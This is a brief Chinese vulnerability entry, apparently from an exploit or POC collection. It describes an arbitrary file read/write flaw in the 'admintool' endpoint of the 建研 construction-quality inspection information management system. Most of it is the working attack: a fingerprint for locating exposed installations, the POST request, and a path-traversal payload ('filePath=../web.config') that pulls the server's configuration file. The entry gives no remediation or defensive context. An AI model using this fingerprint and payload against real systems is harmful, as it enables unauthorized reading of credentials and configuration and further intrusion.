# 建研建设工程质量检测信息管理系统admintool存在任意文件读取漏洞

建研建设工程质量检测信息管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/Content/Theme/Standard/webSite/login.css"`
- **请求**：`POST /Scripts/admintool?type=file HTTP/1.1`

**Payload**
```
filePath=../web.config
```
- **响应特征**：200